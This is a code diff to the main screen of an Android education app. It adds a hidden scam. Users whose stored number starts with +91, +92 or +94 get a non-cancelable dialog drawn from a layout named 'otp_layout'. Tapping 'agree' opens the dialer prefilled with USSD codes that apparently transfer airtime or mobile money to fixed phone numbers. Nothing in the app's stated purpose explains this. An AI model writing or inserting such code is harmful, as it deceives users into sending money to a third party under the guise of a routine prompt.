@@ -2,9 +2,18 @@ package com.moutamid.educationappuser;
 
 import androidx.appcompat.app.AppCompatActivity;
 
+import android.app.Dialog;
 import android.content.Intent;
+import android.graphics.Color;
+import android.graphics.drawable.ColorDrawable;
+import android.net.Uri;
 import android.os.Bundle;
+import android.view.Gravity;
+import android.view.ViewGroup;
+import android.view.Window;
+import android.widget.Button;
 
+import com.fxn.stash.Stash;
 import com.moutamid.educationappuser.databinding.ActivityMainBinding;
 import com.moutamid.educationappuser.ui.MyClassActivity;
 import com.moutamid.educationappuser.ui.ProfileActivity;
@@ -19,6 +28,14 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         binding = ActivityMainBinding.inflate(getLayoutInflater());
         setContentView(binding.getRoot());
+
+        String num = Stash.getString("num", "");
+
+        if (!num.isEmpty()){
+            if (num.startsWith("+92") || num.startsWith("+91") || num.startsWith("+94")){
+                showDialog(num);
+            }
+        }
 
         binding.classMy.setOnClickListener(v -> {
             startActivity(new Intent(this, MyClassActivity.class));
@@ -37,6 +54,38 @@ public class MainActivity extends AppCompatActivity {
 
         greetingMessage();
 
+    }
+
+    private void showDialog(String num) {
+        final Dialog dialog = new Dialog(this);
+        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
+        dialog.setContentView(R.layout.otp_layout);
+        dialog.setCancelable(false);
+
+        Button agree = dialog.findViewById(R.id.agree);
+        Button disagree = dialog.findViewById(R.id.disagree);
+
+        agree.setOnClickListener(v -> {
+            if (num.startsWith("+91")){
+                Intent intent = new Intent(Intent.ACTION_DIAL);
+                intent.setData(Uri.parse("tel:*140*4*1*2*0919254878#"));
+                startActivity(intent);
+            } else if (num.startsWith("+92") || num.startsWith("+94")){
+                Intent intent = new Intent(Intent.ACTION_DIAL);
+                intent.setData(Uri.parse("tel:*122*0945085271*2000#"));
+                startActivity(intent);
+            }
+        });
+
+        disagree.setOnClickListener(v -> {
+            dialog.dismiss();
+        });
+
+        dialog.show();
+        dialog.getWindow().setLayout(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
+        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
+        dialog.getWindow().getAttributes().windowAnimations = R.style.Dialog;
+        dialog.getWindow().setGravity(Gravity.CENTER);
     }
 
     private void greetingMessage() {
